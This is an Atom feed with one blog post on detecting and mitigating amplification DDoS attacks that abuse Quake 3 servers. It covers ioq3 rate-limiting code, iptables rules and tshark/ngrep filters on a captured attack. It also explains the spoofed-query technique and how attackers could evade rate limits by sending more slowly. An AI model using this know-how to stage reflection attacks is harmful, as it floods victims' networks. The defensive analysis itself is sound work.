<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Alejandro Nolla - z0mbiehunt3r]]></title>
  <link href="http://blog.alejandronolla.com/atom.xml" rel="self"/>
  <link href="http://blog.alejandronolla.com/"/>
  <updated>2013-08-06T17:01:01+02:00</updated>
  <id>http://blog.alejandronolla.com/</id>
  <author>
    <name><![CDATA[Alejandro Nolla]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Amplification DDoS attack with Quake3 servers: An analysis(2/2)]]></title>
    <link href="http://blog.alejandronolla.com/2013/08/05/amplification-ddos-attack-with-quake3-servers-an-analysis-2-slash-2/"/>
    <updated>2013-08-05T14:49:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/08/05/amplification-ddos-attack-with-quake3-servers-an-analysis-2-slash-2</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>Last post we analyzed a technique of doing amplified DDoS attacks using Quake 3 servers through spoofing UDP requests to get some game statistics info. In this post I show potential ways of mitigation as well as how to detect this kind of attack at a network level and how to try to automatically parse the attack&#8217;s traffic and generate some firewalling rules. <!-- more --></p>

<h2>Mitigating at the Quake 3 server side</h2>

<p>If we search a bit about Quake 3 servers being used to carry on DDoS attacks we will find this kind of attack <a href="http://www.lemuria.org/security/application-drdos.html">is known</a> since some years ago and, in fact, not only Quake 3 are prone to this type of attack but others games based on Quake 3 engine as well (as COD).</p>

<p>I decided to dig into ioq3 server code to see if there is any kind of mitigation for this type of attack, grep in hand:</p>

<figure class='code'><figcaption><span>greping for potentially interesting strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~/ioq3/code/server<span class="nv">$ </span>grep -iRn <span class="s1">&#39;flood&#39;</span> *
</span><span class='line'>server.h:291:extern   cvar_t  *sv_floodProtect;
</span><span class='line'>sv_client.c:36:flood the server with invalid connection IPs.  With a
</span><span class='line'>sv_client.c:78:   // excess outbound bandwidth usage when being flooded inbound
</span><span class='line'>sv_client.c:1621: // including the usercmd.  This causes flooders to lag themselves
</span><span class='line'>sv_client.c:1627:     sv_floodProtect-&gt;integer <span class="o">&amp;&amp;</span>
</span><span class='line'>sv_client.c:1979:         <span class="k">return</span>;  // we couldnt execute it because of the flood protection
</span><span class='line'>sv_init.c:649:    <span class="nv">sv_floodProtect</span> <span class="o">=</span> Cvar_Get <span class="o">(</span><span class="s2">&quot;sv_floodProtect&quot;</span>, <span class="s2">&quot;1&quot;</span>, CVAR_ARCHIVE | CVAR_SERVERINFO <span class="o">)</span>;
</span><span class='line'>sv_main.c:58:cvar_t   *sv_floodProtect;
</span><span class='line'>sv_main.c:550:    // excess outbound bandwidth usage when being flooded inbound
</span><span class='line'>sv_main.c:613:    // excess outbound bandwidth usage when being flooded inbound
</span><span class='line'>
</span><span class='line'>~/ioq3/code/server<span class="nv">$ </span>grep -iRn <span class="s1">&#39;amplif&#39;</span> *
</span><span class='line'>sv_client.c:70:   // Prevent using getchallenge as an amplifier
</span><span class='line'>sv_main.c:542:    // Prevent using getstatus as an amplifier
</span><span class='line'>sv_main.c:605:    // Prevent using getinfo as an amplifier
</span><span class='line'>sv_main.c:712:    // Prevent using rcon as an amplifier and make dictionary attacks impractical
</span><span class='line'>
</span><span class='line'>~/ioq3/code/server<span class="nv">$ </span>grep -iRn <span class="s1">&#39;dosed&#39;</span> *
</span><span class='line'>sv_client.c:77:   // Allow getchallenge to be DoSed relatively easily, but prevent
</span><span class='line'>sv_main.c:549:    // Allow getstatus to be DoSed relatively easily, but prevent
</span><span class='line'>sv_main.c:612:    // Allow getinfo to be DoSed relatively easily, but prevent
</span></code></pre></td></tr></table></div></figure>


<p>It seems that ioq3 developers have integrated some mitigating mechanisms against DDoS attacks, both when Q3 server is being used as an amplifier and when Q3 is directly attacked with a traffic flood, so take a deeper look into those mechanisms:</p>

<figure class='code'><figcaption><span>ioq3 DDoS detection and mitigation mechanisms - sv_main.c:542</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Prevent using getstatus as an amplifier</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span> <span class="n">SVC_RateLimitAddress</span><span class="p">(</span> <span class="n">from</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1000</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">Com_DPrintf</span><span class="p">(</span> <span class="s">&quot;SVC_Status: rate limit from %s exceeded, dropping request</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="n">NET_AdrToString</span><span class="p">(</span> <span class="n">from</span> <span class="p">)</span> <span class="p">);</span>
</span><span class='line'>  <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>When an IP address sends a &#8220;getstatus&#8221; command some checks are done prior of let command passing, &#8220;SVC_BucketForAddress( from, burst, period )&#8221; call will look for associated data to &#8220;getstatus&#8221; sender IP address:</p>

<figure class='code'><figcaption><span>ioq3 DDoS detection and mitigation mechanisms - sv_main.c:505</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">================</span>
</span><span class='line'><span class="cm">SVC_RateLimitAddress</span>
</span><span class='line'>
</span><span class='line'><span class="cm">Rate limit for a particular address</span>
</span><span class='line'><span class="cm">================</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="n">qboolean</span> <span class="n">SVC_RateLimitAddress</span><span class="p">(</span> <span class="n">netadr_t</span> <span class="n">from</span><span class="p">,</span> <span class="kt">int</span> <span class="n">burst</span><span class="p">,</span> <span class="kt">int</span> <span class="n">period</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">leakyBucket_t</span> <span class="o">*</span><span class="n">bucket</span> <span class="o">=</span> <span class="n">SVC_BucketForAddress</span><span class="p">(</span> <span class="n">from</span><span class="p">,</span> <span class="n">burst</span><span class="p">,</span> <span class="n">period</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">SVC_RateLimit</span><span class="p">(</span> <span class="n">bucket</span><span class="p">,</span> <span class="n">burst</span><span class="p">,</span> <span class="n">period</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now ioq3 will check if sender IP address has exceeded established rate limit, being it 10 commands in just one second period (remember previous call <em>&#8220;if ( SVC_RateLimitAddress( from, 10, 1000 ) )&#8221;</em>):</p>

<figure class='code'><figcaption><span>ioq3 DDoS detection and mitigation mechanisms - sv_main.c:475</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">================</span>
</span><span class='line'><span class="cm">SVC_RateLimit</span>
</span><span class='line'><span class="cm">================</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="n">qboolean</span> <span class="n">SVC_RateLimit</span><span class="p">(</span> <span class="n">leakyBucket_t</span> <span class="o">*</span><span class="n">bucket</span><span class="p">,</span> <span class="kt">int</span> <span class="n">burst</span><span class="p">,</span> <span class="kt">int</span> <span class="n">period</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">bucket</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">now</span> <span class="o">=</span> <span class="n">Sys_Milliseconds</span><span class="p">();</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">interval</span> <span class="o">=</span> <span class="n">now</span> <span class="o">-</span> <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">lastTime</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">expired</span> <span class="o">=</span> <span class="n">interval</span> <span class="o">/</span> <span class="n">period</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">expiredRemainder</span> <span class="o">=</span> <span class="n">interval</span> <span class="o">%</span> <span class="n">period</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">expired</span> <span class="o">&gt;</span> <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">burst</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">burst</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>          <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">lastTime</span> <span class="o">=</span> <span class="n">now</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">burst</span> <span class="o">-=</span> <span class="n">expired</span><span class="p">;</span>
</span><span class='line'>          <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">lastTime</span> <span class="o">=</span> <span class="n">now</span> <span class="o">-</span> <span class="n">expiredRemainder</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">burst</span> <span class="o">&lt;</span> <span class="n">burst</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">bucket</span><span class="o">-&gt;</span><span class="n">burst</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">return</span> <span class="n">qfalse</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">qtrue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As seen, ioq3 server implements some mitigation techniques to avoid using servers as amplifiers but, because they are based on rate limits, an attacker could use them sending at lower rates to avoid being filtered by amplifiers servers, circumventing this protection. A good approach to this type of attack could be implementing challenge-response methods in the game protocol to avoid sending big answers to requests that doesn&#8217;t contain a valid challenge token. Because of the nature of this kind of protection, an attacker shouldn&#8217;t be able to spoof the token request and get it to use in spoofed &#8220;getstatus&#8221; query nor predict a valid token to avoid token request phase and just use a pre-generated token in spoofed &#8220;getstatus&#8221; request (as well as being unable to doing a replay attack using previously used tokens), probably I am going to write another more detailed post about this and other stuff I found while doing some research in the future.</p>

<p>On a similar way to ioq3 server implementation mitigation techniques we could set up an iptables rate limiting policy to automatically drop <em>any</em> traffic from spoofed IP addresses (victim or victims) at layer three and avoid wasting resources on their processing.</p>

<p>I have just totally ripped off this iptables rules from <a href="http://www.quake.ie/blogs/rawshark/preventing-ddos-attacks-quake-3-server.php">here</a>, so credit goes to <a href="http://www.quake.ie/users/rawshark">RawShark</a>:</p>

<figure class='code'><figcaption><span>iptables mitigation of Quake 3 DDoS amplification attack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># create chain</span>
</span><span class='line'>iptables -N quake3_ddos
</span><span class='line'>
</span><span class='line'><span class="c"># accept real client/player traffic</span>
</span><span class='line'>iptables -A quake3_ddos -m u32 ! --u32 <span class="s2">&quot;0x1c=0xffffffff&quot;</span> -j ACCEPT
</span><span class='line'>
</span><span class='line'><span class="c"># match &quot;getstatus&quot; queries and remember their address</span>
</span><span class='line'>iptables -A quake3_ddos -m u32 --u32 <span class="s2">&quot;0x20=0x67657473&amp;&amp;0x24=0x74617475&amp;&amp;0x25&amp;0xff=0x73&quot;</span> -m recent --name getstatus --set
</span><span class='line'>
</span><span class='line'><span class="c"># drop packet if &quot;hits&quot; per &quot;seconds&quot; is reached</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># NOTE: if you run multiple servers on a single host, you will need to higher these limits</span>
</span><span class='line'><span class="c"># as otherwise you will block regular server queries, like Spider or QConnect</span>
</span><span class='line'><span class="c"># e.g. they will query all of your servers within a second to update the list</span>
</span><span class='line'>iptables -A quake3_ddos -m recent --update --name getstatus --hitcount 5 --seconds 2 -j DROP
</span><span class='line'>
</span><span class='line'><span class="c"># accept otherwise</span>
</span><span class='line'>iptables -A quake3_ddos -j ACCEPT
</span><span class='line'>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># finally insert the chain as the top most input filter</span>
</span><span class='line'>
</span><span class='line'><span class="c"># single server</span>
</span><span class='line'><span class="c"># iptables -I INPUT 1 -p udp --dport 27960 -j quake3_ddos</span>
</span><span class='line'>
</span><span class='line'><span class="c"># multiple servers</span>
</span><span class='line'>iptables -I INPUT 1 -p udp --dports 27960,27961,27962 -j quake3_ddos
</span></code></pre></td></tr></table></div></figure>


<p>Only lef to say we only filtered &#8220;getstatus&#8221; command with those iptables rules, remember the others commands as well.</p>

<h2>Hunting it down across the network</h2>

<p>Once we know the ins and outs of this type of DDoS attack and analyzed generate network traffic, as well as readed tool code, we are closer of being able to spot this way of flood and trying to mitigate it. We need to have in mind the fact that, lower TCP/IP layer used to detect anomalous traffic patterns, lower use of resources; it will be much easier to stop a datagram at network layer - maybe based in IP addresses of known Quake 3 servers ;) - than going up to application layer trying to stop a datagram based on its payload and, when dealing with attacks of dozens or hundred of Gbs, the difference will be crucial.</p>

<h3>Using tshark for network analysis</h3>

<p><a href="http://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html">tshark</a> is a terminal based version of Wireshark for doing powerful and quick network packet capturing/analysis and is really useful when doing network forensics because we can use Wireshark&#8217;s <a href="http://wiki.wireshark.org/DisplayFilters">DisplayFilters</a> including <a href="http://www.wireshark.org/docs/dfref/">a lot</a> of supported protocols.</p>

<p>Also, if you are interested in tshark/network analysis, I highly recommend <a href="http://www.packtpub.com/traffic-analysis-with-tshark/book">this</a> ebook called &#8220;Instant Traffic Analysis with Tshark How-to&#8221; and written by <a href="https://twitter.com/BorjaMerino">Borja Merino</a>, it offers a quick and really useful set of recipes for analyzing traffic with tshark, totally worths it.</p>

<p>For example, let&#8217;s specify tshark to show Quake 3 datagrams (using <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">quake3 dissector</a>) with a UDP length of 22 bytes (we could set <a href="http://www.wireshark.org/docs/dfref/q/quake3.html">more specific options</a>):</p>

<figure class='code'><figcaption><span>network forensics with tshark</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tshark -r udp_quake3.pcap.cloaked -R <span class="s1">&#39;udp.length == 22 &amp;&amp; quake3&#39;</span>
</span><span class='line'> 33   0.002043  128.66.0.32 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'> 50   0.003085 128.66.142.197 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'> 83   0.005171 128.66.227.122 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>106   0.006501  128.66.78.4 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>124   0.007610 128.66.249.35 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>129   0.007930 128.66.238.141 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>140   0.008582 128.66.189.147 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>144   0.008812 128.66.238.48 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>147   0.009012 128.66.249.35 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>157   0.009582 128.66.75.113 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>179   0.010909 128.66.238.48 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span></code></pre></td></tr></table></div></figure>


<p>By default tshark will print info with this format &#8220;frame number; relative time; source IP; destination IP; dissected protocol; frame size (bytes); protocol dissected info&#8221; as shown above but it isn&#8217;t well formatted for an easy processing, so let&#8217;s say tshark to show output as formatted CSV:</p>

<figure class='code'><figcaption><span>tshark csv output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tshark -r udp_quake3.pcap.cloaked -R <span class="s1">&#39;udp.length == 22 &amp;&amp; quake3&#39;</span> -T fields -E <span class="nv">separator</span><span class="o">=</span><span class="s1">&#39;;&#39;</span> -e ip.src -e udp.srcport -e ip.dst
</span><span class='line'>128.66.79.215;27960;128.66.7.9
</span><span class='line'>128.66.159.73;27960;128.66.7.9
</span><span class='line'>128.66.119.203;27960;128.66.7.9
</span><span class='line'>128.66.58.250;27960;128.66.7.9
</span><span class='line'>128.66.232.7;27960;128.66.7.9
</span><span class='line'>128.66.120.133;27960;128.66.7.9
</span><span class='line'>128.66.212.39;27960;128.66.7.9
</span><span class='line'>128.66.156.90;27960;128.66.7.9
</span><span class='line'>128.66.189.147;27960;128.66.7.9
</span><span class='line'>128.66.160.78;27960;128.66.7.9
</span><span class='line'>128.66.29.104;27960;128.66.7.9
</span><span class='line'>128.66.143.194;27960;128.66.7.9
</span><span class='line'>128.66.188.75;27960;128.66.7.9
</span><span class='line'>128.66.221.179;27960;128.66.7.9
</span></code></pre></td></tr></table></div></figure>


<p>Now we could make a script to consume tshark output and deploy firewall rules in almost real-time or, maybe, make some pretty statistics for the unavoidable report once the attack has finished / been mitigated.</p>

<p>Probably you are asking yourself the reason I specified an UDP length of 22 bytes, so take a look to the structure of an UDP datagram:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/08/udp_header.png"></p>

<p>As we saw when analyzing udp.c code and his mistakes, an UDP header size is 8 bytes plus any payload, because in this case we have a payload of 14 <em>(&#8220;&#8230;.disconnect&#8221;)</em> bytes it does a total sum of 22 bytes for a triggered response of &#8220;disconnect&#8221; (response provoked by bad seted UDP length in original udp.c code) so it would be useful against this specific bad coded version of attackers&#8217; tool, despite of it should be improved and/or adapted for others versions of scripts or for a well carried spoofed attack in which Quake 3 servers will answer with server info and no with a &#8220;disconnect&#8221; command.</p>

<p>At last but not least, tshark also allow to use Wireshark&#8217;s &#8221;<a href="http://www.wireshark.org/docs/man-pages/wireshark-filter.html">contains</a>&#8221; and &#8220;match&#8221; filters to show only those packets with a specific pattern:</p>

<figure class='code'><figcaption><span>thsark filtering UDP datagrams with &#8220;&#8230;.disconnect&#8221; text</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tshark -r udp_quake3.pcap.cloaked -R <span class="s1">&#39;udp contains ff:ff:ff:ff:64:69:73:63:6f:6e:6e:65:63:74&#39;</span>
</span><span class='line'> 33   0.002043  128.66.0.32 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'> 50   0.003085 128.66.142.197 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'> 70   0.004313 128.66.143.168 -&gt; 128.66.7.9   UDP 60 Source port: 27967  Destination port: 65511
</span><span class='line'> 79   0.004898 128.66.12.63 -&gt; 128.66.7.9   UDP 60 Source port: 27003  Destination port: 13190
</span><span class='line'> 81   0.005006 128.66.239.175 -&gt; 128.66.7.9   UDP 60 Source port: 27990  Destination port: 5475
</span><span class='line'> 83   0.005171 128.66.227.122 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span><span class='line'>106   0.006501  128.66.78.4 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</span></code></pre></td></tr></table></div></figure>


<p>When comparing these results against the previous ones we can observe more amplifiers servers because we are not relying on UDP source port but in UDP payload content to detect them.</p>

<h3>Using ngrep to build iptables rules</h3>

<p><a href="http://ngrep.sourceforge.net/">ngrep</a> is a network troubleshooting tool that allow us to analyze previously captured traffic in a pcap file or a life sniffing session to debug traffic in a similar way like &#8220;grep&#8221; Unix tool, his primary goal is to parse and display plaintext protocols like HTTP or SMTP.</p>

<p>In this case we are going to &#8220;grep&#8221; for a &#8220;&#8230;.disconnect&#8221; string specifying to don&#8217;t print hash marks (-q) :</p>

<figure class='code'><figcaption><span>network forensic with ngrep</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ngrep -q -I udp_quake3.pcap.cloaked <span class="s1">&#39;\xFF\xFF\xFF\xFFdisconnect&#39;</span>
</span><span class='line'>U 128.66.238.228:27961 -&gt; 128.66.7.9:26457
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.0.103:27960 -&gt; 128.66.7.9:65247
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.217.157:27960 -&gt; 128.66.7.9:48320
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.238.48:27960 -&gt; 128.66.7.9:32267
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.132.204:27960 -&gt; 128.66.7.9:58316
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.168.194:27993 -&gt; 128.66.7.9:12525
</span><span class='line'>....disconnect....
</span><span class='line'>
</span><span class='line'>U 128.66.168.248:27961 -&gt; 128.66.7.9:8946
</span><span class='line'>....disconnect....
</span></code></pre></td></tr></table></div></figure>


<p>While this format is easy to read by a human we would need to parse it prior to doing any kind of filtering. For example, we could parse this output to just show Quake 3 amplifiers servers being used in the attack to generate some type of firewall rule:</p>

<figure class='code'><figcaption><span>parsing ngrep output to get just amplifiers IP addresses</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ngrep -q -I udp_quake3.pcap.cloaked <span class="s1">&#39;\xFF\xFF\xFF\xFFdisconnect&#39;</span> | awk <span class="s1">&#39;/U [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/{print $2}&#39;</span> | cut -d <span class="s1">&#39;:&#39;</span> -f 1 | sort -u
</span><span class='line'>128.66.99.246
</span><span class='line'>128.66.99.28
</span><span class='line'>192.0.2.155
</span><span class='line'>192.0.2.239
</span><span class='line'>192.0.2.45
</span><span class='line'>198.51.100.213
</span><span class='line'>198.51.100.225
</span><span class='line'>198.51.100.65
</span><span class='line'>203.0.113.120
</span></code></pre></td></tr></table></div></figure>


<p>We could go a step ahead and create a set of DROP rules for a Linux router with iptables beyond parsing ngrep output:</p>

<figure class='code'><figcaption><span>generating iptables rules based on ngrep output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>ip in <span class="sb">`</span>ngrep -q -I udp_quake3.pcap.cloaked <span class="s1">&#39;\xFF\xFF\xFF\xFFdisconnect&#39;</span> | awk <span class="s1">&#39;/U [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/{print $2}&#39;</span> | cut -d <span class="s1">&#39;:&#39;</span> -f 1 | sort -u<span class="sb">`</span>; <span class="k">do </span><span class="nb">echo</span> <span class="s2">&quot;iptables -A FORWARD -s $ip -j DROP&quot;</span> &gt;&gt; quake3_ddos.iptables; <span class="k">done</span>
</span><span class='line'><span class="nv">$ </span>head -n 5 quake3_ddos.iptables
</span><span class='line'>iptables -A FORWARD -s 128.66.0.103 -j DROP
</span><span class='line'>iptables -A FORWARD -s 128.66.0.18 -j DROP
</span><span class='line'>iptables -A FORWARD -s 128.66.0.181 -j DROP
</span><span class='line'>iptables -A FORWARD -s 128.66.0.246 -j DROP
</span><span class='line'>iptables -A FORWARD -s 128.66.0.27 -j DROP
</span></code></pre></td></tr></table></div></figure>


<h3>Parsing attack with scapy and automatic deployment of a Cisco IOS access-list</h3>

<p>Ok, analyzing network traffic and spotting attack patterns is fun, but analyzing traffic looking for previously spotted pattern and automatically blocking attacking IP addresses at perimetral routers is far better, so I&#8217;m going to explain how to make such easy but powerful script in a few lines with python.</p>

